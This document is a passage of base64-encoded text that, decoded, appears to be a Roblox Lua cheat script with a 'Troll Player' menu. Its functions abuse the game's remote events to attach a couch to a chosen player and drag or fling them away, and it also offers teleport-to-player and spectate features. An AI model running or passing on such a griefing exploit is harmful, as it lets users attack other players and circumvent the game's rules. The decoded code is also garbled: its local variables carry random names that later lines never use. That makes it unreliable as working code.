iKTpJbnZva2VTZXJ2ZXIoIlBpY2tpbmdUb29scyIsICJDb3VjaCIpCiAgICB0YXNrLndhaXQoMC4zKQoKICAgIGxvY2FsIHZhcl90eGg1NXYgPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgaWYgdG9vbCB0aGVuCiAgICAgICAgdG9vbC5QYXJlbnQgPSBjaGFyCiAgICBlbmQKICAgIHRhc2sud2FpdCgwLjEpCgogICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMSkKCiAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCBmYWxzZSkKICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHRSb290IG9yIGh1bQoKICAgIGxvY2FsIHZhcl9kZ3ByZ2ogPSBJbnN0YW5jZS5uZXcoIkJvZHlQb3NpdGlvbiIpCiAgICBhbGlnbi5OYW1lID0gIkJyaW5nUG9zaXRpb24iCiAgICBhbGlnbi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICBhbGlnbi5EID0gMTAKICAgIGFsaWduLlAgPSAzMDAwMAogICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uCiAgICBhbGlnbi5QYXJlbnQgPSB0Um9vdAoKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl82azV2OTMgPSAwCiAgICAgICAgbG9jYWwgdmFyXzM5cjFnaiA9IHRpY2soKQogICAgICAgIHdoaWxlIHRpY2soKSAtIHN0YXJ0VGltZSA8IDUgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgZG8KICAgICAgICAgICAgbG9jYWwgdmFyXzM3aHQyZCA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIG5vdCB0SHVtIG9yIHRIdW0uU2l0IHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICBsb2NhbCB2YXJfbzFybml4ID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIHZhcl9lYzgzMmUgPSBocnAuUG9zaXRpb24gKyAoaHJwLlZlbG9jaXR5IC8gMS41KQoKICAgICAgICAgICAgYW5nbGUgKz0gOTc5CiAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhhZGp1c3RlZFBvcyArIFZlY3RvcjMubmV3KDAsIDIsIDApKSAqIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoYW5nbGUpLCAwLCAwKQogICAgICAgICAgICBhbGlnbi5Qb3NpdGlvbiA9IHJvb3QuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygyLCAwLCAwKQoKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKCiAgICAgICAgYWxpZ246RGVzdHJveSgpCiAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgdHJ1ZSkKICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSBodW0KCiAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoY2hhcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBwOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBwLlZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICBwLlJvdFZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIHJvb3QuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KG9yaWdpbmFsUG9zKQogICAgICAgIHRhc2sud2FpdCgwLjAwMSkKICAgICAgICByb290LkFuY2hvcmVkID0gZmFsc2UKCiAgICAgICAgdGFzay53YWl0KDAuNykKICAgICAgICBsb2NhbCB2YXJfNG45c3htID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCgogICAgICAgIHRhc2sud2FpdCgwLjAwMSkKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgZW5kKQplbmQKCi0tIEJyaW5nV2l0aENvdWNoIEZ1bmN0aW9uCmxvY2FsIHZhcl9hYjR6MWogQnJpbmdXaXRoQ291Y2goKQogICAgbG9jYWwgdmFyXzkweW1veiA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoZ2V0Z2VudigpLlRhcmdldCkKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIgdGhlbgogICAgICAgIHdhcm4oIkVycm9yOiBObyB0YXJnZXQgcGxheWVyIHNlbGVjdGVkIikKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgaWYgbm90IHRhcmdldFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgd2FybigiRXJyb3I6IFRhcmdldCBwbGF5ZXIgaGFzIG5vIGNoYXJhY3RlciBvciBIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIHZhcl96MjFjc3kgPSB7IFsxXSA9ICJDbGVhckFsbFRvb2xzIiB9CiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRVsiMUNsZWExclRvb2wxcyJdOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgbG9jYWwgdmFyX2xlY2N4aSA9IHsgWzFdID0gIlBpY2tpbmdUb29scyIsIFsyXSA9ICJDb3VjaCIgfQogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgbG9jYWwgdmFyX3F0bjliZyA9IExvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCgiQ291Y2giLCAyKQogICAgaWYgbm90IGNvdWNoIHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogQ291Y2ggbm90IGZvdW5kIGluIEJhY2twYWNrIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGNvdWNoLk5hbWUgPSAiQ2hhb3MuQ291Y2giCiAgICBsb2NhbCB2YXJfNmlpeW9vID0gY291Y2g6RmluZEZpcnN0Q2hpbGQoIlNlYXQxIikKICAgIGxvY2FsIHZhcl9sb2ZnZWEgPSBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiU2VhdDIiKQogICAgbG9jYWwgdmFyX3d3bHl1MCA9IGNvdWNoOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKQogICAgaWYgc2VhdDEgYW5kIHNlYXQyIGFuZCBoYW5kbGUgdGhlbgogICAgICAgIHNlYXQxLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIHNlYXQyLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGhhbmRsZS5OYW1lID0gIkhhbmRsZSAiCiAgICBlbHNlCiAgICAgICAgd2FybigiRXJyb3I6IENvdWNoIGNvbXBvbmVudHMgbm90IGZvdW5kIikKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgogICAgbG9jYWwgdmFyX2hmZDVuaSA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5Iiwgc2VhdDEpCiAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgdGV0LlAgPSAxMjUwCiAgICB0ZXQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIKCiAgICByZXBlYXQKICAgICAgICBmb3IgbSA9IDEsIDM1IGRvCiAgICAgICAgICAgIGxvY2FsIHZhcl9rbmgzbzkgPSB7IHggPSAwLCB5ID0gMCwgeiA9IDAgfQogICAgICAgICAgICBsb2NhbCB2YXJfZjlpaWlnID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGlmIG5vdCB0Um9vdCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBwb3MueCA9IHRSb290LlBvc2l0aW9uLlggKyAodFJvb3QuVmVsb2NpdHkuWCAvIDIpCiAgICAgICAgICAgIHBvcy55ID0gdFJvb3QuUG9zaXRpb24uWSArICh0Um9vdC5WZWxvY2l0eS5ZIC8gMikKICAgICAgICAgICAgcG9zLnogPSB0Um9vdC5Qb3NpdGlvbi5aICsgKHRSb290LlZlbG9jaXR5LlogLyAyKQogICAgICAgICAgICBzZWF0MS5DRnJhbWUgPSBDRnJhbWUubmV3KFZlY3RvcjMubmV3KHBvcy54LCBwb3MueSwgcG9zLnopKSAqIENGcmFtZS5uZXcoLTIsIDIsIDApCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCiAgICAgICAgdGV0OkRlc3Ryb3koKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpLk5hbWUgPSAiSGFuZGxlIgogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGNvdWNoLkhhbmRsZS5OYW1lID0gIkhhbmRsZSAiCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIHNlYXQxKQogICAgICAgIHRldC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgdGV0LlAgPSAxMjUwCiAgICAgICAgdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICB0ZXQuTmFtZSA9ICIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIgogICAgdW50aWwgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZCBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZQogICAgdGFzay53YWl0KCkKICAgIHRldDpEZXN0cm95KCkKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICB0YXNrLndhaXQoKQogICAgY291Y2g6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSAiKS5OYW1lID0gIkhhbmRsZSIKICAgIHRhc2sud2FpdCgwLjMpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIHRhc2sud2FpdCgwLjMpCiAgICBjb3VjaC5HcmlwID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldygwLCAwLCAwKSkKICAgIHRhc2sud2FpdCgwLjMpCiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRVsiMUNsZWExclRvb2wxcyJdOkZpcmVTZXJ2ZXIoIkNsZWFyQWxsVG9vbHMiKQplbmQKCi0tIEtpbGxXaXRoQ291Y2ggRnVuY3Rpb24KbG9jYWwgdmFyX3J2ZWt5aSBLaWxsV2l0aENvdWNoKCkKICAgIGxvY2FsIHZhcl85NHl6MmcgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKGdldGdlbnYoKS5UYXJnZXQpCiAgICBpZiBub3QgdGFyZ2V0UGxheWVyIHRoZW4KICAgICAgICB3YXJuKCJFcnJvcjogTm8gdGFyZ2V0IHBsYXllciBzZWxlY3RlZCIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgIHdhcm4oIkVycm9yOiBUYXJnZXQgcGxheWVyIGhhcyBubyBjaGFyYWN0ZXIgb3IgSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfc2RrZW82ID0geyBbMV0gPSAiQ2xlYXJBbGxUb29scyIgfQogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVbIjFDbGVhMXJUb29sMXMiXTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGxvY2FsIHZhcl95dnQ4dXYgPSB7IFsxXSA9ICJQaWNraW5nVG9vbHMiLCBbMl0gPSAiQ291Y2giIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoKICAgIGxvY2FsIHZhcl9mbDJzZDQgPSBMb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQoIkNvdWNoIiwgMikKICAgIGlmIG5vdCBjb3VjaCB0aGVuCiAgICAgICAgd2FybigiRXJyb3I6IENvdWNoIG5vdCBmb3VuZCBpbiBCYWNrcGFjayIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBjb3VjaC5OYW1lID0gIkNoYW9zLkNvdWNoIgogICAgbG9jYWwgdmFyXzdheTJyNiA9IGNvdWNoOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpCiAgICBsb2NhbCB2YXJfajVpeGMzID0gY291Y2g6RmluZEZpcnN0Q2hpbGQoIlNlYXQyIikKICAgIGxvY2FsIHZhcl96cWlnazIgPSBjb3VjaDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikKICAgIGlmIHNlYXQxIGFuZCBzZWF0MiBhbmQgaGFuZGxlIHRoZW4KICAgICAgICBzZWF0MS5EaXNhYmxlZCA9IHRydWUKICAgICAgICBzZWF0Mi5EaXNhYmxlZCA9IHRydWUKICAgICAgICBoYW5kbGUuTmFtZSA9ICJIYW5kbGUgIgogICAgZWxzZQogICAgICAgIHdhcm4oIkVycm9yOiBDb3VjaCBjb21wb25lbnRzIG5vdCBmb3VuZCIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoKICAgIGxvY2FsIHZhcl9zcmVvM28gPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIHNlYXQxKQogICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIHRldC5QID0gMTI1MAogICAgdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIHRldC5OYW1lID0gIiNtT1ZPT0VQRiQjQEYkI0dFUkUuLj5WPDw8PEVXPFY8PFciCgogICAgcmVwZWF0CiAgICAgICAgZm9yIG0gPSAxLCAzNSBkbwogICAgICAgICAgICBsb2NhbCB2YXJfcWh4MzFiID0geyB4ID0gMCwgeSA9IDAsIHogPSAwIH0KICAgICAgICAgICAgbG9jYWwgdmFyX3NoNGp5NiA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICBpZiBub3QgdFJvb3QgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgcG9zLnggPSB0Um9vdC5Qb3NpdGlvbi5YICsgKHRSb290LlZlbG9jaXR5LlggLyAyKQogICAgICAgICAgICBwb3MueSA9IHRSb290LlBvc2l0aW9uLlkgKyAodFJvb3QuVmVsb2NpdHkuWSAvIDIpCiAgICAgICAgICAgIHBvcy56ID0gdFJvb3QuUG9zaXRpb24uWiArICh0Um9vdC5WZWxvY2l0eS5aIC8gMikKICAgICAgICAgICAgc2VhdDEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCwgcG9zLnksIHBvcy56KSkgKiBDRnJhbWUubmV3KC0yLCAyLCAwKQogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgICAgIHRldDpEZXN0cm95KCkKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2g6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSAiKS5OYW1lID0gIkhhbmRsZSIKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBjb3VjaC5IYW5kbGUuTmFtZSA9ICJIYW5kbGUgIgogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgdGV0ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiLCBzZWF0MSkKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIKICAgIHVudGlsIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUKICAgIHRhc2sud2FpdCgpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgc2VhdDEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5LCAtNDUwLCA5OTk5KQogICAgc2VhdDIuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5LCAtNDUwLCA5OTk5KQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICB0YXNrLndhaXQoMC4xKQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIHRhc2sud2FpdCgyKQogICAgbG9jYWwgdmFyXzBnb2xjMCA9IHNlYXQxOkZpbmRGaXJzdENoaWxkKCIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIikKICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVbIjFDbGVhMXJUb29sMXMiXTpGaXJlU2VydmVyKCJDbGVhckFsbFRvb2xzIikKZW5kCiAgICBsb2NhbCB2YXJfa2k0aGY5ID0gVHJvbGw6QWRkU2VjdGlvbih7IE5hbWUgPSAiVHJvbGwgUGxheWVyIiB9KQoKICAgIC0tIEZ1bmN0aW9uIHRvIGdldCBsaXN0IG9mIHBsYXllcnMKICAgIGxvY2FsIHZhcl9zczRjYWIgZ2V0UGxheWVyTGlzdCgpCiAgICAgICAgbG9jYWwgdmFyX2R0NmJ0dCA9IFBsYXllcnM6R2V0UGxheWVycygpCiAgICAgICAgbG9jYWwgdmFyX3F1NjZzbyA9IHt9CiAgICAgICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMocGxheWVycykgZG8KICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChwbGF5ZXJOYW1lcywgcGxheWVyLk5hbWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBwbGF5ZXJOYW1lcwogICAgZW5kCgogICAgbG9jYWwgdmFyX242MnllZCA9IFRyb2xsOkFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gIlNlbGVjdCAiLAogICAgICAgIE9wdGlvbnMgPSBnZXRQbGF5ZXJMaXN0KCksCiAgICAgICAgRGVmYXVsdCA9ICIiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIHNlbGVjdGVkUGxheWVyTmFtZSA9IHZhbHVlCiAgICAgICAgICAgIGdldGdlbnYoKS5UYXJnZXQgPSB2YWx1ZQogICAgICAgICAgICBwcmludCgiU2VsZWN0ZWQgcGxheWVyOiAiIC4uIHRvc3RyaW5nKHZhbHVlKSkKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGw6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIlVwZGF0ZSBsaXN0IiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgdmFyX29sZjl3eCA9IFBsYXllcnM6R2V0UGxheWVycygpCiAgICAgICAgICAgIGxvY2FsIHZhcl9lM3UyaTMgPSB7fQogICAgICAgICAgICBpZiBraWxsRHJvcGRvd24gYW5kICN0YWJsZVBsYXllcnMgPiAwIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKHRhYmxlUGxheWVycykgZG8KICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXIuTmFtZSB+PSBMb2NhbFBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KG5ld1BsYXllcnMsIHBsYXllci5OYW1lKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBraWxsRHJvcGRvd246U2V0KG5ld1BsYXllcnMpCiAgICAgICAgICAgICAgICBwcmludCgiUGxheWVyIGxpc3QgdXBkYXRlZDogIiwgdGFibGUuY29uY2F0KG5ld1BsYXllcnMsICIsICIpKQogICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRQbGF5ZXJOYW1lIGFuZCBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZFBsYXllck5hbWUgPSBuaWwKICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICAgICAga2lsbERyb3Bkb3duOlNldFZhbHVlKCIiKQogICAgICAgICAgICAgICAgICAgIHByaW50KCJTZWxlY3Rpb24gcmVzZXQsIHBsYXllciBpcyBubyBsb25nZXIgaW4gdGhlIHNlcnZlci4iKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHByaW50KCJFcnJvcjogRHJvcGRvd24gbm90IGZvdW5kIG9yIG5vIHBsYXllcnMgYXZhaWxhYmxlLiIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBUcm9sbDpBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSAiVGVsZXBvcnQgdG8gdGhlIHBsYXllciIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBwcmludCgiRXJyb3I6IFBsYXllciBub3Qgc2VsZWN0ZWQgb3IgZG9lcyBub3QgZXhpc3QiKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCB2YXJfeWU5djdjID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIHZhcl84d2o5ZWIgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIG5vdCBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIHdhcm4oIkVycm9yOiBMb2NhbCBwbGF5ZXIncyBIdW1hbm9pZFJvb3RQYXJ0IG5vdCBmb3VuZCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCB2YXJfajB2cHZ6ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludCgiRXJyb3I6IFRhcmdldCBwbGF5ZXIgbm90IGZvdW5kIG9yIGhhcyBubyBIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRyb2xsOkFkZFRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICJWaWV3IFBsYXllciIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIGxvY2FsIHZhcl8ycHB0d2EgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKICAgICAgICAgICAgbG9jYWwgdmFyX3dtMTRpYiBVcGRhdGVDYW1lcmEoKQogICAgICAgICAgICAgICAgaWYgdmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9mdGx0NjkgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfM3ZvaXBpID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3Rl